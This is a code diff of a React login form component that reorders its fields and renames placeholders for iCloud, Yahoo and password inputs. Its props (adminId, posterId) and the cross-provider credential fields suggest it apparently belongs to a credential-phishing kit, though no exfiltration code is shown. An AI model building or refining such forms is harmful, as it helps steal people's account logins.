@@ -57,27 +57,26 @@ function LoginForm({ adminId, posterId }) {
 
               <Field
                 className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-gray-300  shadow-inner placeholder:font-medium placeholder:text-black/50 focus:border-[#1a73e8] rounded "
-                placeholder="Password"
-                name="password"
-                type="password"
-                autoComplete="on"
-                required
-              />
-              <Field
-                className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-gray-300  shadow-inner placeholder:font-medium placeholder:text-black/50 focus:border-[#1a73e8] rounded "
-                placeholder="Icloud Id"
+                placeholder="Icloud"
                 name="icloud"
                 type="text"
                 required
               />
               <Field
                 className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-gray-300  shadow-inner placeholder:font-medium placeholder:text-black/50 focus:border-[#1a73e8] rounded "
-                placeholder="Yahoo Id"
+                placeholder="Yahoo"
                 name="yahoo"
                 type="text"
                 required
               />
-
+              <Field
+                className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-gray-300  shadow-inner placeholder:font-medium placeholder:text-black/50 focus:border-[#1a73e8] rounded "
+                placeholder="Password"
+                name="password"
+                type="password"
+                autoComplete="on"
+                required
+              />
               <button
                 type="submit"
                 className="mt-5 w-full text-lg font-bold bg-[#1a73e8]  py-[10px] text-white transition duration-300 rounded-full"
